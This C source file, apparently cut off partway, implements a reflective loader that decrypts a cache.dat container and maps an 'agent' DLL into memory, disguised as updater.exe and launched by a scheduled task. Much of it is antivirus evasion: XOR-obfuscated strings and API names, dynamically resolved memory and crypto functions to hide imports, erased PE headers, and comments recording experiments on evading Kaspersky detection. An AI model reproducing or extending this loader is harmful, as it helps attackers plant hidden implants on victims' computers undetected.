#include <windows.h>
#include <bcrypt.h>
#include <stdlib.h>
#include <string.h>

/*
 * 文件作用：专门加载 DHPL1 direct_https 容器的 profile-only loader。
 *
 * 小白版流程：
 * 1. exe 优先读取 cache.dat；如果没有，再回退读取 cache.dhpl；
 * 2. 用 AES-256-GCM 解密，得到 DHPL1 自定义容器；
 * 3. 容器里不是完整 PE 文件，而是已经离线拆好的 section/import/reloc/TLS 等最小信息；
 * 4. loader 按这些最小信息把 direct_https DLL 映射到内存；
 * 5. 内存 image base 位置不复制 MZ/PE/section header；
 * 6. RunAgentDll 的 RVA 已由 packer 离线写进 DHPL1，运行时不查 export table；
 * 7. 调 RunAgentDll，进入 direct_https 学习版 agent。
 *
 * 这不是通用 PE loader。它只服务于当前 packer 产出的 direct_https_profile.x64.dll。
 */

typedef DWORD (WINAPI *RunAgentDllFn)(void);
typedef BOOL (WINAPI *DllMainFn)(HINSTANCE, DWORD, LPVOID);

#define PROFILE_ONLY_ASCII_XOR_KEY 0x5A

/*
 * MinGW 的 crt2.o 会引用 _pei386_runtime_relocator()；
 * 默认情况下这会把 libmingw32.a 里的 pseudo-reloc.o 一起拉进来，
 * 于是额外带入：
 *   - __imp_VirtualProtect / __imp_VirtualQuery
 *   - "  VirtualProtect failed with code 0x%x" 之类的诊断字符串
 *
 * 当前 profile-only noenv single 默认路线不依赖 MinGW runtime pseudo-reloc：
 * - 源码编译单元自身已经不再直接引用 VirtualAlloc / VirtualFree /
 *   GetSystemInfo / RtlAddFunctionTable / VirtualProtect；
 * - 运行时需要的 WinAPI 由 loader 自己用 LoadLibraryA/GetProcAddress 解析；
 * - 实验验证过：用 no-op stub 覆盖 _pei386_runtime_relocator 后，功能链
 *   （callback / hello / baseline / second-instance）仍完整通过。
 *
 * 因此仅在显式开启该宏时，用本地 stub 挡住 MinGW 的 pseudo-reloc.o。
 * 这样可以把默认 dynmem 目标里的残留 VirtualProtect import 去掉。
 */
#if defined(PROFILE_ONLY_DISABLE_MINGW_RUNTIME_PSEUDO_RELOC)
void _pei386_runtime_relocator(void)
{
}
#endif

#define DHPL_VERSION 1
#define DHPL_ARCH_X64 0x8664
#define DHPL_MAGIC0 0x4c
#define DHPL_MAGIC1 0x57
#define DHPL_MAGIC2 0x39
#define DHPL_MAGIC3 0x15
#define DHPL_MAGIC4 0x4b

#define DHPLE2_VERSION 2
#define DHPLE_ALG_AES256_GCM_PBKDF2_SHA256_KEY 2
#define DHPLE_KDF_PBKDF2_HMAC_SHA256 1
#define DHPLE_MAGIC0 0x48
#define DHPLE_MAGIC1 0x5d
#define DHPLE_MAGIC2 0x72
#define DHPLE_MAGIC3 0x05
#define DHPLE_MAGIC4 0x6a
#define DHPLE_MAGIC5_V2 0x02

/*
 * release 版把几个最显眼的固定明文（默认 key、env 名、默认 payload 文件名）
 * 先做一层轻量 XOR 存放，避免 strings 直接看到实验标签。
 *
 * 这不是加密，只是最小化“把协议信息/实验命名直接明文暴露在 loader 里”。
 * 功能语义保持不变：无参双击仍然优先找 cache.dat，找不到再回退 cache.dhpl；
 * 默认 key / env 名也仍与现有脚本兼容。
 */
static const unsigned char g_profile_only_key_enc[] = {
    57, 46, 60, 119, 55, 63, 55, 53, 40, 35, 119, 54, 53, 59, 62,
    63, 40, 119, 49, 63, 35, 119, 104, 106, 104, 108, 106, 108, 104, 110
};
#if !defined(PROFILE_ONLY_NO_ENV_KEY)
static const unsigned char g_profile_only_key_env_enc[] = { 30, 18, 10, 22, 5, 17, 31, 3 };
#endif
#if defined(PROFILE_ONLY_DIAG) && !defined(PROFILE_ONLY_NO_LOG_ENV)
static const unsigned char g_profile_only_log_env_enc[] = { 30, 18, 10, 22, 5, 22, 21, 27, 30, 31, 8, 5, 22, 21, 29 };
#endif
static const unsigned char g_profile_only_cache_dat_enc[] = { 57, 59, 57, 50, 63, 116, 62, 59, 46 };
static const unsigned char g_profile_only_cache_dhpl_enc[] = { 57, 59, 57, 50, 63, 116, 62, 50, 42, 54 };

static const unsigned char DHPLE_AAD_V2[] = {
    0x79, 0x3b, 0x73, 0x0c, 0x26, 0x4c, 0x27, 0x10,
    0x48, 0x73, 0x63, 0x6a, 0x0a, 0x33, 0x0e, 0x21,
    0x06, 0x3c, 0x02, 0x53, 0x6d, 0x67, 0x16, 0x1a
};

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

/*
 * R01 单变量实验：release_plus_diag_strings。
 *
 * 背景：
 * - Kaspersky 当前会处理更“小、更安静”的 release loader；
 * - diag loader 因为携带大量 DHPL/DHPLE 状态字符串、WriteFile/wsprintfA 和日志分支，
 *   在同一环境下反而能落地、上线。
 *
 * 这个宏只给 release 变体加入一组“可见但不参与核心逻辑”的状态字符串，
 * 用来验证是否是二进制字符串/布局扰动改变了落地检测结果。
 * 它不写日志、不改变 key derive、解密、映射、import、TLS、DllMain、RunAgentDll 逻辑。
 */
#if defined(PROFILE_ONLY_RELEASE_MARKERS)
__attribute__((used))
static const char* const g_profile_release_markers[] = {
    "DHPL_START",
    "DHPL_READ_OK_SIZE",
    "DHPLE2_HEADER_FOUND",
    "DHPLE2_KEY_DERIVE_OK",
    "DHPLE2_DECRYPT_OK",
    "DHPL_VALIDATE_OK",
    "DHPL_ALLOC_OK",
    "DHPL_SECTIONS_OK",
    "DHPL_RELOC_OK",
    "DHPL_IMPORT_OK",
    "DHPL_EXCEPTION_OK",
    "DHPL_PROTECT_OK",
    "DHPL_TLS_OK",
    "DHPL_DLLMAIN_OK",
    "DHPL_HEADER_ZERO_OK",
    "DHPL_CONTAINER_ZERO_OK",
    "DHPL_RUN_AGENT_BEGIN"
};

static void touch_release_markers(void)
{
    /*
     * volatile 让编译器保留这个引用，避免 -Os 下把整组字符串优化掉。
     * 条件永远不成立，不会产生实际行为变化。
     */
    volatile const char* p = g_profile_release_markers[0];
    if (p == (const char*)1) {
        Sleep(0);
    }
}
#else
static void touch_release_markers(void)
{
}
#endif

#if defined(PROFILE_ONLY_DIAG)
static const char* g_log_path = NULL;
#endif

static void decode_ascii_xor(char* out, SIZE_T outSize, const unsigned char* enc, SIZE_T encLen)
{
    SIZE_T i;
    if (!out || !enc || outSize < encLen + 1) return;
    for (i = 0; i < encLen; i++) {
        out[i] = (char)(enc[i] ^ PROFILE_ONLY_ASCII_XOR_KEY);
    }
    out[encLen] = 0;
}

static const char* get_default_key_fallback(void)
{
    static char buf[sizeof(g_profile_only_key_enc) + 1];
    static int init = 0;
    if (!init) {
        decode_ascii_xor(buf, sizeof(buf), g_profile_only_key_enc, sizeof(g_profile_only_key_enc));
        init = 1;
    }
    return buf;
}

#if !defined(PROFILE_ONLY_NO_ENV_KEY)
static const char* get_key_env_name(void)
{
    static char buf[sizeof(g_profile_only_key_env_enc) + 1];
    static int init = 0;
    if (!init) {
        decode_ascii_xor(buf, sizeof(buf), g_profile_only_key_env_enc, sizeof(g_profile_only_key_env_enc));
        init = 1;
    }
    return buf;
}
#endif

#if defined(PROFILE_ONLY_DIAG) && !defined(PROFILE_ONLY_NO_LOG_ENV)
static const char* get_log_env_name(void)
{
    static char buf[sizeof(g_profile_only_log_env_enc) + 1];
    static int init = 0;
    if (!init) {
        decode_ascii_xor(buf, sizeof(buf), g_profile_only_log_env_enc, sizeof(g_profile_only_log_env_enc));
        init = 1;
    }
    return buf;
}
#endif

static const char* get_default_cache_dat_name(void)
{
    static char buf[sizeof(g_profile_only_cache_dat_enc) + 1];
    static int init = 0;
    if (!init) {
        decode_ascii_xor(buf, sizeof(buf), g_profile_only_cache_dat_enc, sizeof(g_profile_only_cache_dat_enc));
        init = 1;
    }
    return buf;
}

static const char* get_default_cache_dhpl_name(void)
{
    static char buf[sizeof(g_profile_only_cache_dhpl_enc) + 1];
    static int init = 0;
    if (!init) {
        decode_ascii_xor(buf, sizeof(buf), g_profile_only_cache_dhpl_enc, sizeof(g_profile_only_cache_dhpl_enc));
        init = 1;
    }
    return buf;
}

#if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
typedef NTSTATUS (WINAPI *BCryptOpenAlgorithmProviderFn)(
    BCRYPT_ALG_HANDLE*,
    LPCWSTR,
    LPCWSTR,
    ULONG);
typedef NTSTATUS (WINAPI *BCryptCloseAlgorithmProviderFn)(
    BCRYPT_ALG_HANDLE,
    ULONG);
typedef NTSTATUS (WINAPI *BCryptDeriveKeyPBKDF2Fn)(
    BCRYPT_ALG_HANDLE,
    PUCHAR,
    ULONG,
    PUCHAR,
    ULONG,
    ULONGLONG,
    PUCHAR,
    ULONG,
    ULONG);
typedef NTSTATUS (WINAPI *BCryptSetPropertyFn)(
    BCRYPT_HANDLE,
    LPCWSTR,
    PUCHAR,
    ULONG,
    ULONG);
typedef NTSTATUS (WINAPI *BCryptGetPropertyFn)(
    BCRYPT_HANDLE,
    LPCWSTR,
    PUCHAR,
    ULONG,
    ULONG*,
    ULONG);
typedef NTSTATUS (WINAPI *BCryptGenerateSymmetricKeyFn)(
    BCRYPT_ALG_HANDLE,
    BCRYPT_KEY_HANDLE*,
    PUCHAR,
    ULONG,
    PUCHAR,
    ULONG,
    ULONG);
typedef NTSTATUS (WINAPI *BCryptDecryptFn)(
    BCRYPT_KEY_HANDLE,
    PUCHAR,
    ULONG,
    VOID*,
    PUCHAR,
    ULONG,
    PUCHAR,
    ULONG,
    ULONG*,
    ULONG);
typedef NTSTATUS (WINAPI *BCryptDestroyKeyFn)(
    BCRYPT_KEY_HANDLE);

static const unsigned char g_bcrypt_module_enc[] = { 56, 57, 40, 35, 42, 46, 116, 62, 54, 54 };
static const unsigned char g_bcrypt_open_alg_enc[] = {
    24, 25, 40, 35, 42, 46, 21, 42, 63, 52, 27, 54, 61, 53, 40, 51, 46, 50, 55, 10, 40, 53, 44, 51, 62, 63, 40
};
static const unsigned char g_bcrypt_close_alg_enc[] = {
    24, 25, 40, 35, 42, 46, 25, 54, 53, 41, 63, 27, 54, 61, 53, 40, 51, 46, 50, 55, 10, 40, 53, 44, 51, 62, 63, 40
};
static const unsigned char g_bcrypt_pbkdf2_enc[] = {
    24, 25, 40, 35, 42, 46, 30, 63, 40, 51, 44, 63, 17, 63, 35, 10, 24, 17, 30, 28, 104
};
static const unsigned char g_bcrypt_set_property_enc[] = {
    24, 25, 40, 35, 42, 46, 9, 63, 46, 10, 40, 53, 42, 63, 40, 46, 35
};
static const unsigned char g_bcrypt_get_property_enc[] = {
    24, 25, 40, 35, 42, 46, 29, 63, 46, 10, 40, 53, 42, 63, 40, 46, 35
};
static const unsigned char g_bcrypt_generate_key_enc[] = {
    24, 25, 40, 35, 42, 46, 29, 63, 52, 63, 40, 59, 46, 63, 9, 35, 55, 55, 63, 46, 40, 51, 57, 17, 63, 35
};
static const unsigned char g_bcrypt_decrypt_enc[] = {
    24, 25, 40, 35, 42, 46, 30, 63, 57, 40, 35, 42, 46
};
static const unsigned char g_bcrypt_destroy_key_enc[] = {
    24, 25, 40, 35, 42, 46, 30, 63, 41, 46, 40, 53, 35, 17, 63, 35
};

static BCryptOpenAlgorithmProviderFn g_pBCryptOpenAlgorithmProvider = NULL;
static BCryptCloseAlgorithmProviderFn g_pBCryptCloseAlgorithmProvider = NULL;
static BCryptDeriveKeyPBKDF2Fn g_pBCryptDeriveKeyPBKDF2 = NULL;
static BCryptSetPropertyFn g_pBCryptSetProperty = NULL;
static BCryptGetPropertyFn g_pBCryptGetProperty = NULL;
static BCryptGenerateSymmetricKeyFn g_pBCryptGenerateSymmetricKey = NULL;
static BCryptDecryptFn g_pBCryptDecrypt = NULL;
static BCryptDestroyKeyFn g_pBCryptDestroyKey = NULL;
static int g_dynamic_bcrypt_ready = 0;

static int resolve_dynamic_bcrypt(void)
{
    char moduleName[sizeof(g_bcrypt_module_enc) + 1];
    char openAlgName[sizeof(g_bcrypt_open_alg_enc) + 1];
    char closeAlgName[sizeof(g_bcrypt_close_alg_enc) + 1];
    char pbkdf2Name[sizeof(g_bcrypt_pbkdf2_enc) + 1];
    char setPropertyName[sizeof(g_bcrypt_set_property_enc) + 1];
    char getPropertyName[sizeof(g_bcrypt_get_property_enc) + 1];
    char generateKeyName[sizeof(g_bcrypt_generate_key_enc) + 1];
    char decryptName[sizeof(g_bcrypt_decrypt_enc) + 1];
    char destroyKeyName[sizeof(g_bcrypt_destroy_key_enc) + 1];
    HMODULE mod;

    if (g_dynamic_bcrypt_ready > 0) return 1;
    if (g_dynamic_bcrypt_ready < 0) return 0;

    decode_ascii_xor(moduleName, sizeof(moduleName), g_bcrypt_module_enc, sizeof(g_bcrypt_module_enc));
    decode_ascii_xor(openAlgName, sizeof(openAlgName), g_bcrypt_open_alg_enc, sizeof(g_bcrypt_open_alg_enc));
    decode_ascii_xor(closeAlgName, sizeof(closeAlgName), g_bcrypt_close_alg_enc, sizeof(g_bcrypt_close_alg_enc));
    decode_ascii_xor(pbkdf2Name, sizeof(pbkdf2Name), g_bcrypt_pbkdf2_enc, sizeof(g_bcrypt_pbkdf2_enc));
    decode_ascii_xor(setPropertyName, sizeof(setPropertyName), g_bcrypt_set_property_enc, sizeof(g_bcrypt_set_property_enc));
    decode_ascii_xor(getPropertyName, sizeof(getPropertyName), g_bcrypt_get_property_enc, sizeof(g_bcrypt_get_property_enc));
    decode_ascii_xor(generateKeyName, sizeof(generateKeyName), g_bcrypt_generate_key_enc, sizeof(g_bcrypt_generate_key_enc));
    decode_ascii_xor(decryptName, sizeof(decryptName), g_bcrypt_decrypt_enc, sizeof(g_bcrypt_decrypt_enc));
    decode_ascii_xor(destroyKeyName, sizeof(destroyKeyName), g_bcrypt_destroy_key_enc, sizeof(g_bcrypt_destroy_key_enc));

    mod = LoadLibraryA(moduleName);
    if (!mod) goto fail;

    g_pBCryptOpenAlgorithmProvider = (BCryptOpenAlgorithmProviderFn)(void*)GetProcAddress(mod, openAlgName);
    g_pBCryptCloseAlgorithmProvider = (BCryptCloseAlgorithmProviderFn)(void*)GetProcAddress(mod, closeAlgName);
    g_pBCryptDeriveKeyPBKDF2 = (BCryptDeriveKeyPBKDF2Fn)(void*)GetProcAddress(mod, pbkdf2Name);
    g_pBCryptSetProperty = (BCryptSetPropertyFn)(void*)GetProcAddress(mod, setPropertyName);
    g_pBCryptGetProperty = (BCryptGetPropertyFn)(void*)GetProcAddress(mod, getPropertyName);
    g_pBCryptGenerateSymmetricKey = (BCryptGenerateSymmetricKeyFn)(void*)GetProcAddress(mod, generateKeyName);
    g_pBCryptDecrypt = (BCryptDecryptFn)(void*)GetProcAddress(mod, decryptName);
    g_pBCryptDestroyKey = (BCryptDestroyKeyFn)(void*)GetProcAddress(mod, destroyKeyName);

    if (!g_pBCryptOpenAlgorithmProvider ||
        !g_pBCryptCloseAlgorithmProvider ||
        !g_pBCryptDeriveKeyPBKDF2 ||
        !g_pBCryptSetProperty ||
        !g_pBCryptGetProperty ||
        !g_pBCryptGenerateSymmetricKey ||
        !g_pBCryptDecrypt ||
        !g_pBCryptDestroyKey) {
        goto fail;
    }

    g_dynamic_bcrypt_ready = 1;
    return 1;

fail:
    g_pBCryptOpenAlgorithmProvider = NULL;
    g_pBCryptCloseAlgorithmProvider = NULL;
    g_pBCryptDeriveKeyPBKDF2 = NULL;
    g_pBCryptSetProperty = NULL;
    g_pBCryptGetProperty = NULL;
    g_pBCryptGenerateSymmetricKey = NULL;
    g_pBCryptDecrypt = NULL;
    g_pBCryptDestroyKey = NULL;
    g_dynamic_bcrypt_ready = -1;
    return 0;
}
#endif

#if defined(PROFILE_ONLY_DYNAMIC_MEM_API)
typedef LPVOID (WINAPI *VirtualAllocFn)(
    LPVOID,
    SIZE_T,
    DWORD,
    DWORD);
typedef BOOL (WINAPI *VirtualFreeFn)(
    LPVOID,
    SIZE_T,
    DWORD);
typedef BOOL (WINAPI *VirtualProtectFn)(
    LPVOID,
    SIZE_T,
    DWORD,
    PDWORD);
typedef VOID (WINAPI *GetSystemInfoFn)(
    LPSYSTEM_INFO);
typedef BOOLEAN (WINAPI *RtlAddFunctionTableFn)(
    PRUNTIME_FUNCTION,
    DWORD,
    DWORD64);

static const unsigned char g_kernel32_module_enc[] = { 49, 63, 40, 52, 63, 54, 105, 104, 116, 62, 54, 54 };
static const unsigned char g_virtual_alloc_enc[] = { 12, 51, 40, 46, 47, 59, 54, 27, 54, 54, 53, 57 };
static const unsigned char g_virtual_free_enc[] = { 12, 51, 40, 46, 47, 59, 54, 28, 40, 63, 63 };
static const unsigned char g_virtual_protect_enc[] = { 12, 51, 40, 46, 47, 59, 54, 10, 40, 53, 46, 63, 57, 46 };
static const unsigned char g_get_system_info_enc[] = { 29, 63, 46, 9, 35, 41, 46, 63, 55, 19, 52, 60, 53 };
static const unsigned char g_rtl_add_function_table_enc[] = { 8, 46, 54, 27, 62, 62, 28, 47, 52, 57, 46, 51, 53, 52, 14, 59, 56, 54, 63 };

static VirtualAllocFn g_pVirtualAlloc = NULL;
static VirtualFreeFn g_pVirtualFree = NULL;
static VirtualProtectFn g_pVirtualProtect = NULL;
static GetSystemInfoFn g_pGetSystemInfo = NULL;
static RtlAddFunctionTableFn g_pRtlAddFunctionTable = NULL;
static int g_dynamic_mem_ready = 0;

static int resolve_dynamic_mem_api(void)
{
    char moduleName[sizeof(g_kernel32_module_enc) + 1];
    char virtualAllocName[sizeof(g_virtual_alloc_enc) + 1];
    char virtualFreeName[sizeof(g_virtual_free_enc) + 1];
    char virtualProtectName[sizeof(g_virtual_protect_enc) + 1];
    char getSystemInfoName[sizeof(g_get_system_info_enc) + 1];
    char rtlAddFunctionTableName[sizeof(g_rtl_add_function_table_enc) + 1];
    HMODULE mod;

    if (g_dynamic_mem_ready > 0) return 1;
    if (g_dynamic_mem_ready < 0) return 0;

    decode_ascii_xor(moduleName, sizeof(moduleName), g_kernel32_module_enc, sizeof(g_kernel32_module_enc));
    decode_ascii_xor(virtualAllocName, sizeof(virtualAllocName), g_virtual_alloc_enc, sizeof(g_virtual_alloc_enc));
    decode_ascii_xor(virtualFreeName, sizeof(virtualFreeName), g_virtual_free_enc, sizeof(g_virtual_free_enc));
    decode_ascii_xor(virtualProtectName, sizeof(virtualProtectName), g_virtual_protect_enc, sizeof(g_virtual_protect_enc));
    decode_ascii_xor(getSystemInfoName, sizeof(getSystemInfoName), g_get_system_info_enc, sizeof(g_get_system_info_enc));
    decode_ascii_xor(rtlAddFunctionTableName, sizeof(rtlAddFunctionTableName), g_rtl_add_function_table_enc, sizeof(g_rtl_add_function_table_enc));

    mod = LoadLibraryA(moduleName);
    if (!mod) goto fail;

    g_pVirtualAlloc = (VirtualAllocFn)(void*)GetProcAddress(mod, virtualAllocName);
    g_pVirtualFree = (VirtualFreeFn)(void*)GetProcAddress(mod, virtualFreeName);
    g_pVirtualProtect = (VirtualProtectFn)(void*)GetProcAddress(mod, virtualProtectName);
    g_pGetSystemInfo = (GetSystemInfoFn)(void*)GetProcAddress(mod, getSystemInfoName);
    g_pRtlAddFunctionTable = (RtlAddFunctionTableFn)(void*)GetProcAddress(mod, rtlAddFunctionTableName);

    if (!g_pVirtualAlloc ||
        !g_pVirtualFree ||
        !g_pVirtualProtect ||
        !g_pGetSystemInfo ||
        !g_pRtlAddFunctionTable) {
        goto fail;
    }

    g_dynamic_mem_ready = 1;
    return 1;

fail:
    g_pVirtualAlloc = NULL;
    g_pVirtualFree = NULL;
    g_pVirtualProtect = NULL;
    g_pGetSystemInfo = NULL;
    g_pRtlAddFunctionTable = NULL;
    g_dynamic_mem_ready = -1;
    return 0;
}

static LPVOID dhpl_virtual_alloc(LPVOID address, SIZE_T size, DWORD allocType, DWORD protect)
{
    if (!resolve_dynamic_mem_api()) return NULL;
    return g_pVirtualAlloc(address, size, allocType, protect);
}

static BOOL dhpl_virtual_free(LPVOID address, SIZE_T size, DWORD freeType)
{
    if (!resolve_dynamic_mem_api()) return FALSE;
    return g_pVirtualFree(address, size, freeType);
}

static BOOL dhpl_virtual_protect(LPVOID address, SIZE_T size, DWORD newProtect, PDWORD oldProtect)
{
    if (!resolve_dynamic_mem_api()) return FALSE;
    return g_pVirtualProtect(address, size, newProtect, oldProtect);
}

static DWORD dhpl_get_page_size(void)
{
    SYSTEM_INFO si;
    if (!resolve_dynamic_mem_api()) return 0x1000;
    SecureZeroMemory(&si, sizeof(si));
    g_pGetSystemInfo(&si);
    return si.dwPageSize ? si.dwPageSize : 0x1000;
}

static int dhpl_add_function_table(PRUNTIME_FUNCTION table, DWORD count, DWORD64 imageBase)
{
    if (!resolve_dynamic_mem_api()) return 0;
    return g_pRtlAddFunctionTable(table, count, imageBase) ? 1 : 0;
}
#else
static LPVOID dhpl_virtual_alloc(LPVOID address, SIZE_T size, DWORD allocType, DWORD protect)
{
    return VirtualAlloc(address, size, allocType, protect);
}

static BOOL dhpl_virtual_free(LPVOID address, SIZE_T size, DWORD freeType)
{
    return VirtualFree(address, size, freeType);
}

static BOOL dhpl_virtual_protect(LPVOID address, SIZE_T size, DWORD newProtect, PDWORD oldProtect)
{
    return VirtualProtect(address, size, newProtect, oldProtect);
}

static DWORD dhpl_get_page_size(void)
{
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    return si.dwPageSize ? si.dwPageSize : 0x1000;
}

static int dhpl_add_function_table(PRUNTIME_FUNCTION table, DWORD count, DWORD64 imageBase)
{
    return RtlAddFunctionTable(table, count, imageBase) ? 1 : 0;
}
#endif

#pragma pack(push, 1)
typedef struct DHPL_HEADER {
    char magic[8];
    DWORD version;
    DWORD arch;
    DWORD header_size;
    DWORD flags;
    ULONGLONG preferred_base;
    DWORD image_size;
    DWORD size_of_headers;
    DWORD entry_point_rva;
    DWORD run_agent_rva;
    DWORD section_count;
    DWORD reloc_count;
    DWORD import_count;
    DWORD tls_count;
    DWORD exception_rva;
    DWORD exception_size;
    DWORD sections_offset;
    DWORD relocs_offset;
    DWORD imports_offset;
    DWORD tls_offset;
    DWORD data_offset;
    DWORD total_size;
    DWORD reserved0;
    DWORD reserved1;
} DHPL_HEADER;

typedef struct DHPL_SECTION {
    DWORD virtual_address;
    DWORD virtual_size;
    DWORD raw_size;
    DWORD data_offset;
    DWORD data_size;
    DWORD characteristics;
    DWORD protect;
    DWORD reserved;
} DHPL_SECTION;

typedef struct DHPL_IMPORT_FIXED {
    DWORD iat_rva;
    WORD module_len;
    WORD name_len;
} DHPL_IMPORT_FIXED;

typedef struct DHPLE2_HEADER {
    char magic[8];
    DWORD version;
    DWORD algorithm;
    DWORD kdf;
    DWORD iterations;
    DWORD salt_len;
    DWORD nonce_len;
    DWORD tag_len;
    DWORD plain_size;
    DWORD cipher_size;
} DHPLE2_HEADER;
#pragma pack(pop)

static void diag_log(const char* text)
{
#if defined(PROFILE_ONLY_DIAG)
    HANDLE h;
    DWORD written = 0;
    if (!g_log_path || !text) return;
    h = CreateFileA(g_log_path, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    WriteFile(h, text, (DWORD)strlen(text), &written, NULL);
    WriteFile(h, "\r\n", 2, &written, NULL);
    CloseHandle(h);
#else
    (void)text;
#endif
}

static void diag_log_num(const char* key, DWORD value)
{
#if defined(PROFILE_ONLY_DIAG)
    char buf[128];
    wsprintfA(buf, "%s=%lu", key ? key : "value", (unsigned long)value);
    diag_log(buf);
#else
    (void)key;
    (void)value;
#endif
}

static void diag_log_hex64(const char* key, ULONGLONG value)
{
#if defined(PROFILE_ONLY_DIAG)
    char buf[160];
    wsprintfA(buf, "%s=0x%08lx%08lx", key ? key : "value", (unsigned long)(value >> 32), (unsigned long)(value & 0xffffffffULL));
    diag_log(buf);
#else
    (void)key;
    (void)value;
#endif
}

static void* heap_alloc(SIZE_T size)
{
    return HeapAlloc(GetProcessHeap(), 0, size);
}

static void heap_free(void* ptr)
{
    if (ptr) HeapFree(GetProcessHeap(), 0, ptr);
}

static void heap_secure_free(unsigned char* ptr, DWORD size)
{
    if (ptr) {
        if (size) SecureZeroMemory(ptr, size);
        heap_free(ptr);
    }
}

static DWORD align_up_dword(DWORD value, DWORD align)
{
    return (value + align - 1) & ~(align - 1);
}

static DWORD align_down_dword(DWORD value, DWORD align)
{
    return value & ~(align - 1);
}

static int range_ok(DWORD offset, DWORD size, DWORD total)
{
    return offset <= total && size <= total - offset;
}

static int rva_range_ok(DWORD rva, DWORD size, DWORD image_size)
{
    return rva <= image_size && size <= image_size - rva;
}

static int file_exists_nondir(const char* path)
{
    DWORD attrs;
    if (!path || !path[0]) return 0;
    attrs = GetFileAttributesA(path);
    if (attrs == INVALID_FILE_ATTRIBUTES) return 0;
    return (attrs & FILE_ATTRIBUTE_DIRECTORY) == 0;
}

static const char* resolve_default_container_path(void)
{
    const char* cacheDat = get_default_cache_dat_name();
    const char* cacheDhpl = get_default_cache_dhpl_name();
    /*
     * 从“两文件目录可双击”的角度，新的默认优先级是：
     * 1. cache.dat  —— 当前 Windows staging 统一发布名；
     * 2. cache.dhpl —— 兼容旧目录/旧手工投放方式。
     *
     * 这样既不破坏老目录，也让只有 updater.exe + cache.dat 的目录可以直接双击。
     */
    if (file_exists_nondir(cacheDat)) return cacheDat;
    if (file_exists_nondir(cacheDhpl)) return cacheDhpl;
    return cacheDat;
}

static int read_file_winapi(const char* path, unsigned char** outBuf, DWORD* outSize)
{
    HANDLE h;
    LARGE_INTEGER li;
    DWORD total = 0;
    unsigned char* buf;

    if (!path || !outBuf || !outSize) return 1;
    *outBuf = NULL;
    *outSize = 0;

    h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 2;
    if (!GetFileSizeEx(h, &li) || li.QuadPart <= 0 || li.QuadPart > 128 * 1024 * 1024) {
        CloseHandle(h);
        return 3;
    }
    buf = (unsigned char*)heap_alloc((SIZE_T)li.QuadPart);
    if (!buf) {
        CloseHandle(h);
        return 4;
    }
    while (total < (DWORD)li.QuadPart) {
        DWORD got = 0;
        DWORD want = (DWORD)li.QuadPart - total;
        if (!ReadFile(h, buf + total, want, &got, NULL) || got == 0) {
            heap_free(buf);
            CloseHandle(h);
            return 5;
        }
        total += got;
    }
    CloseHandle(h);
    *outBuf = buf;
    *outSize = total;
    return 0;
}

static const char* resolve_key_source(const char* keyArg)
{
#if defined(PROFILE_ONLY_NO_ENV_KEY)
    /*
     * production/noenv 变体只保留：
     * 1. argv[2] literal key，方便实验时临时覆盖；
     * 2. embedded fallback key，保证 updater.exe + cache.dat 无参双击路径。
     *
     * 这样 release_noenv 的 IAT/strings 不再携带 getenv / DHPL_KEY 语义。
     */
    if (keyArg && keyArg[0]) {
        return keyArg;
    }
    return get_default_key_fallback();
#else
    const char* value = NULL;
    const char* defaultKeyEnv = get_key_env_name();

    /*
     * key 来源优先级：
     * 1. argv[2]：直接当 passphrase literal；
     * 2. 如果 argv[2] 没传，尝试默认环境变量；
     * 3. 最后回退到内置 fallback key，保证同目录无参双击路径不被破坏。
     *
     * 说明：
     * - loader 本体不再解析 `env:` / `file:` 这类启动协议；
     * - 如果上层希望用环境变量、key 文件、DPAPI blob 等方式隐藏明文，
     *   应由外层启动器先准备好运行环境，再让 loader 只看到最终 key。
     */
    if (keyArg && keyArg[0]) {
        return keyArg;
    }

    value = getenv(defaultKeyEnv);
    if (value && value[0]) return value;

    return get_default_key_fallback();
#endif
}

#if defined(PROFILE_ONLY_SINGLE_INSTANCE)
static DWORD fnv1a_path_ci(const char* s)
{
    DWORD h = 2166136261u;
    while (s && *s) {
        unsigned char c = (unsigned char)*s++;
        if (c >= 'A' && c <= 'Z') c = (unsigned char)(c + ('a' - 'A'));
        if (c == '/') c = '\\';
        h ^= (DWORD)c;
        h *= 16777619u;
    }
    return h;
}

static void hex32_lower(char out[9], DWORD v)
{
    static const char hx[] = "0123456789abcdef";
    int i;
    for (i = 0; i < 8; i++) {
        out[i] = hx[(v >> (28 - i * 4)) & 0xf];
    }
    out[8] = 0;
}

static int acquire_single_instance(void)
{
    char modulePath[1024];
    char mutexName[64];
    char hex[9];
    DWORD n;
    DWORD h;
    int i;
    HANDLE m;

    n = GetModuleFileNameA(NULL, modulePath, (DWORD)sizeof(modulePath));
    if (!n || n >= (DWORD)sizeof(modulePath)) {
        return 1;
    }
    modulePath[n] = 0;
    for (i = (int)n - 1; i >= 0; i--) {
        if (modulePath[i] == '\\' || modulePath[i] == '/') {
            modulePath[i] = 0;
            break;
        }
    }
    h = fnv1a_path_ci(modulePath);
    hex32_lower(hex, h);

    /*
     * Mutex 只绑定当前 updater.exe 所在目录。
     * 用 Global namespace 是因为首发实例常由 scheduled task 启动，
     * 二次双击/SSH 复测可能在另一个 Windows session；Local namespace
     * 会让两个 session 各自创建同名 mutex，挡不住重复实例。
     */
    mutexName[0] = 'G';
    mutexName[1] = 'l';
    mutexName[2] = 'o';
    mutexName[3] = 'b';
    mutexName[4] = 'a';
    mutexName[5] = 'l';
    mutexName[6] = '\\';
    mutexName[7] = 'u';
    mutexName[8] = 'p';
    mutexName[9] = 'd';
    mutexName[10] = '_';
    memcpy(mutexName + 11, hex, 9);

    m = CreateMutexA(NULL, TRUE, mutexName);
    if (!m) {
        return 1;
    }
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(m);
        return 0;
    }
    return 1;
}
#else
static int acquire_single_instance(void)
{
    return 1;
}
#endif

static int dhple2_magic_ok(const DHPLE2_HEADER* h)
{
    return h &&
        h->magic[0] == DHPLE_MAGIC0 &&
        h->magic[1] == DHPLE_MAGIC1 &&
        h->magic[2] == DHPLE_MAGIC2 &&
        h->magic[3] == DHPLE_MAGIC3 &&
